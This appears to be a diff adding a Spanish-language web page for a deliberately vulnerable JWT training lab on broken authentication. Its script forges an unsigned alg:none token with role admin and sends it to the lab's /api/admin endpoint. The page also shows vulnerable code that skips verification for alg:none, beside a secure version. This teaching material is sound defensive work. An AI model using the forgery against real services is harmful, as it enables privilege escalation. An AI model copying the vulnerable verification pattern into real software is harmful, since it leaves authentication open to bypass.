@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>JWT Lab</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0f1117;color:#e2e8f0;min-height:100vh}
+header{background:#1a1d27;border-bottom:1px solid #2d3149;padding:1rem 1.5rem;display:flex;align-items:center;gap:.75rem;flex-wrap:wrap}
+header h1{font-size:1.05rem;font-weight:700}
+.badge{font-size:.68rem;font-weight:700;padding:.2rem .6rem;border-radius:999px;text-transform:uppercase}
+.b-owasp{background:#1e40af;color:#93c5fd}.b-vuln{background:#7f1d1d;color:#fca5a5}.b-safe{background:#14532d;color:#86efac}
+main{max-width:960px;margin:1.5rem auto;padding:0 1.5rem}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem}
+@media(max-width:640px){.grid2{grid-template-columns:1fr}}
+.card{background:#1e2235;border:1px solid #2d3149;border-radius:10px;padding:1.2rem;margin-bottom:1rem}
+.card h3{font-size:.78rem;text-transform:uppercase;letter-spacing:.05em;color:#94a3b8;margin-bottom:.9rem}
+.field{margin-bottom:.7rem}
+.field label{display:block;font-size:.78rem;color:#94a3b8;margin-bottom:.3rem}
+.field input{width:100%;padding:.45rem .75rem;background:#0f1117;border:1px solid #2d3149;border-radius:6px;color:#f8fafc;font-size:.85rem;font-family:monospace}
+.field input:focus{outline:none;border-color:#4f46e5}
+.btn{padding:.45rem 1rem;border:none;border-radius:6px;cursor:pointer;font-size:.82rem;font-weight:600}
+.btn-primary{background:#4f46e5;color:#fff}.btn-attack{background:#7f1d1d;color:#fca5a5}.btn-sm{padding:.3rem .65rem;font-size:.75rem}
+.jwt-parts{display:flex;flex-direction:column;gap:.4rem;margin-bottom:.75rem}
+.jwt-part{padding:.5rem .75rem;border-radius:6px;font-family:monospace;font-size:.78rem;word-break:break-all;line-height:1.4}
+.jwt-h{background:#1a2a3f;border:1px solid #1e3a5f;color:#60a5fa}
+.jwt-p{background:#1a2e1a;border:1px solid #14532d;color:#4ade80}
+.jwt-s{background:#2a1a2a;border:1px solid #4a2060;color:#c084fc}
+.jwt-label{font-size:.68rem;text-transform:uppercase;letter-spacing:.05em;opacity:.7;margin-bottom:.2rem}
+pre.json{background:#0f1117;border:1px solid #2d3149;border-radius:6px;padding:.6rem .8rem;font-size:.77rem;overflow-x:auto;white-space:pre-wrap;word-break:break-all;color:#94a3b8;margin-top:.3rem}
+.alert{padding:.6rem 1rem;border-radius:8px;font-size:.82rem;margin:.4rem 0}
+.a-danger{background:#2d1b1b;border:1px solid #7f1d1d;color:#fca5a5}
+.a-success{background:#1a2e1f;border:1px solid #14532d;color:#86efac}
+.a-info{background:#1e2a3f;border:1px solid #1e40af;color:#93c5fd}
+.resp{background:#0f1117;border:1px solid #2d3149;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:.77rem;line-height:1.5;white-space:pre-wrap;word-break:break-all;min-height:60px;color:#94a3b8;margin-top:.5rem}
+.ok{color:#4ade80}.err{color:#f87171}.key{color:#93c5fd}.val{color:#fde68a}
+.code{background:#0f1117;border:1px solid #2d3149;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:.77rem;line-height:1.6;white-space:pre-wrap;overflow-x:auto}
+.hl-bad{background:rgba(239,68,68,.15);border-left:3px solid #ef4444;display:block;padding-left:.5rem}
+.hl-good{background:rgba(74,222,128,.1);border-left:3px solid #4ade80;display:block;padding-left:.5rem}
+.c-kw{color:#c084fc}.c-fn{color:#60a5fa}.c-str{color:#fde68a}.c-cm{color:#475569;font-style:italic}
+</style>
+</head>
+<body>
+<header>
+  <h1>Broken Authentication — JWT</h1>
+  <span class="badge b-owasp">OWASP A07:2025</span>
+  <span id="mode-badge" class="badge">cargando…</span>
+  <span id="mode-desc" style="font-size:.78rem;color:#94a3b8;margin-left:.5rem"></span>
+</header>
+
+<main>
+  <div id="global-alert"></div>
+
+  <div class="grid2">
+    <!-- Login -->
+    <div class="card">
+      <h3>1. Obtén un token JWT</h3>
+      <div class="field"><label>Usuario</label><input id="usr" value="alice"/></div>
+      <div class="field"><label>Contraseña</label><input id="pwd" type="password" value="password123"/></div>
+      <div style="display:flex;gap:.5rem;flex-wrap:wrap">
+        <button class="btn btn-primary btn-sm" onclick="doLogin()">Login (alice — user)</button>
+        <button class="btn btn-sm" style="background:#1e2235;border:1px solid #2d3149;color:#94a3b8" onclick="document.getElementById('usr').value='admin';document.getElementById('pwd').value='admin123';doLogin()">Login (admin)</button>
+      </div>
+      <div id="login-result" style="margin-top:.75rem"></div>
+    </div>
+
+    <!-- JWT Visualizer -->
+    <div class="card">
+      <h3>2. JWT decodificado</h3>
+      <div id="jwt-vis">
+        <p style="color:#64748b;font-size:.83rem">Inicia sesión para ver el token</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Attack -->
+  <div class="card">
+    <h3>3. Forjar token con alg:none para escalar a admin</h3>
+    <div id="attack-note" class="alert a-info">Primero inicia sesión para obtener un token base.</div>
+    <div style="display:flex;gap:.75rem;flex-wrap:wrap;margin-bottom:.75rem">
+      <button class="btn btn-attack btn-sm" onclick="forgeAndSend()">🔓 Forjar token alg:none + role:admin → enviar a /api/admin</button>
+      <button class="btn btn-primary btn-sm" onclick="sendLegitToken()">Enviar token legítimo a /api/admin</button>
+    </div>
+    <div id="forge-preview" style="display:none">
+      <p style="font-size:.75rem;color:#f87171;margin-bottom:.4rem">Token forjado (sin firma):</p>
+      <div id="forged-token-display" class="jwt-part jwt-h" style="word-break:break-all;font-size:.73rem"></div>
+    </div>
+    <div id="admin-result"></div>
+    <div id="admin-resp" class="resp">— sin petición —</div>
+  </div>
+
+  <!-- Code -->
+  <div class="card">
+    <h3>Comparación de código</h3>
+    <div class="grid2">
+      <div>
+        <p style="font-size:.75rem;color:#f87171;font-weight:700;margin-bottom:.4rem">❌ Vulnerable</p>
+        <div class="code"><span class="c-cm">// Acepta alg:none (sin firma)</span>
+<span class="hl-bad"><span class="c-kw">if</span> (header.alg !== <span class="c-str">'none'</span>) {
+  jwt.<span class="c-fn">verify</span>(token, <span class="c-str">'secret'</span>); <span class="c-cm">// secreto débil</span>
+}
+<span class="c-cm">// Confía en el role del token (no verifica DB)</span>
+<span class="c-kw">if</span> (payload.role !== <span class="c-str">'admin'</span>) abort();</span>
+<span class="c-cm">// Ataque: cambiar alg→none + role→admin
+// → sin firma → sin secreto necesario</span></div>
+      </div>
+      <div>
+        <p style="font-size:.75rem;color:#4ade80;font-weight:700;margin-bottom:.4rem">✅ Segura</p>
+        <div class="code"><span class="c-cm">// Secreto fuerte (32 bytes random)</span>
+<span class="hl-good"><span class="c-kw">const</span> payload = jwt.<span class="c-fn">verify</span>(token, SECRET, {
+  algorithms: [<span class="c-str">'HS256'</span>] <span class="c-cm">// alg:none rechazado</span>
+});
+<span class="c-cm">// Rol verificado en DB, no en el token</span>
+<span class="c-kw">const</span> dbUser = DB.<span class="c-fn">find</span>(u => u.id === payload.userId);
+<span class="c-kw">if</span> (dbUser.role !== <span class="c-str">'admin'</span>) abort();</span></div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<script>
+let SECURE = false;
+let currentToken = null;
+
+function b64d(s) {
+  return atob(s.replace(/-/g,'+').replace(/_/g,'/').padEnd(s.length+(4-s.length%4)%4,'='));
+}
+function b64e(s) {
+  return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+}
+function decodeJWT(t) {
+  const [h,p,s] = t.split('.');
+  return { header: JSON.parse(b64d(h)), payload: JSON.parse(b64d(p)), sig: s, raw: {h,p,s} };
+}
+
+async function init() {
+  const cfg = await fetch('/api/config').then(r=>r.json());
+  SECURE = cfg.secure;
+  const mb = document.getElementById('mode-badge');
+  mb.textContent = SECURE ? '✓ SECURE' : '⚠ VULNERABLE';
+  mb.className = 'badge ' + (SECURE ? 'b-safe' : 'b-vuln');
+  document.getElementById('mode-desc').textContent = SECURE
+    ? 'alg forzado a HS256 · secreto fuerte · rol verificado en DB'
+    : `secreto débil = "${cfg.weak_secret}" · acepta alg:none · confía en el role del token`;
+
+  if (!SECURE) {
+    document.getElementById('global-alert').innerHTML =
+      `<div class="alert a-danger" style="margin-bottom:1rem">⚠ Secreto JWT débil (<b>"${cfg.weak_secret}"</b>) y se acepta <b>alg:none</b>. Puedes forjar un token de admin sin conocer el secreto.</div>`;
+  } else {
+    document.getElementById('global-alert').innerHTML =
+      `<div class="alert a-success" style="margin-bottom:1rem">✓ Secreto JWT fuerte (aleatorio al inicio) y solo se acepta HS256. El rol se verifica en la base de datos.</div>`;
+  }
+}
+
+async function doLogin() {
+  const data = await fetch('/api/login', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({
+      username: document.getElementById('usr').value,
+      password: document.getElementById('pwd').value
+    })
+  }).then(r=>r.json());
+
+  if (data.error) {
+    document.getElementById('login-result').innerHTML = `<div class="alert a-danger">${data.error}</div>`;
+    return;
+  }
+
+  currentToken = data.token;
+  document.getElementById('login-result').innerHTML =
+    `<div class="alert a-success">✓ Login exitoso: <b>${data.user.username}</b> (rol: ${data.user.role})</div>`;
+
+  renderJWT(currentToken);
+  document.getElementById('attack-note').className = 'alert a-info';
+  document.getElementById('attack-note').textContent =
+    `Token obtenido para "${data.user.username}" (rol: ${data.user.role}). Ahora forja uno con role:admin.`;
+}
+
+function renderJWT(token) {
+  const d = decodeJWT(token);
+  document.getElementById('jwt-vis').innerHTML = `
+    <div class="jwt-parts">
+      <div class="jwt-part jwt-h">
+        <div class="jwt-label">Header (base64url)</div>
+        <div>${d.raw.h}</div>
+        <pre class="json">${JSON.stringify(d.header,null,2)}</pre>
+      </div>
+      <div class="jwt-part jwt-p">
+        <div class="jwt-label">Payload (base64url)</div>
+        <div>${d.raw.p}</div>
+        <pre class="json">${JSON.stringify(d.payload,null,2)}</pre>
+      </div>
+      <div class="jwt-part jwt-s">
+        <div class="jwt-label">Signature</div>
+        <div>${d.raw.s || '(vacía — alg:none)'}</div>
+      </div>
+    </div>`;
+}
+
+function forgeAndSend() {
+  if (!currentToken) {
+    document.getElementById('attack-note').textContent = 'Primero inicia sesión.';
+    return;
+  }
+  const orig = decodeJWT(currentToken);
+  const newHeader  = { alg: 'none', typ: 'JWT' };
+  const newPayload = { ...orig.payload, role: 'admin', username: 'admin (forjado)', userId: 99 };
+  const forged = `${b64e(JSON.stringify(newHeader))}.${b64e(JSON.stringify(newPayload))}.`;
+
+  document.getElementById('forge-preview').style.display = 'block';
+  document.getElementById('forged-token-display').textContent = forged;
+
+  sendToAdmin(forged, true);
+}
+
+function sendLegitToken() {
+  if (!currentToken) { alert('Inicia sesión primero'); return; }
+  sendToAdmin(currentToken, false);
+}
+
+async function sendToAdmin(token, isForged) {
+  const res = await fetch('/api/admin', { headers: { 'Authorization': 'Bearer ' + token } });
+  const data = await res.json();
+  const ar = document.getElementById('admin-result');
+
+  if (res.ok && isForged) {
+    ar.innerHTML = `<div class="alert a-danger">🔓 ATAQUE EXITOSO: token forjado con alg:none aceptado. Datos de admin expuestos.</div>`;
+  } else if (res.ok) {
+    ar.innerHTML = `<div class="alert a-success">✓ Acceso legítimo al panel admin.</div>`;
+  } else {
+    ar.innerHTML = `<div class="alert a-success">🛡 Acceso denegado (${res.status}): ${data.error}</div>`;
+  }
+
+  document.getElementById('admin-resp').innerHTML =
+    `<span class="${res.ok?'ok':'err'}">HTTP ${res.status}</span>\n` +
+    `<span class="key">Token tipo:</span> <span class="val">${isForged ? 'FORJADO (alg:none, sin firma)' : 'Legítimo'}</span>\n\n` +
+    esc(JSON.stringify(data,null,2));
+}
+
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+init();
+</script>
+</body>
+</html>
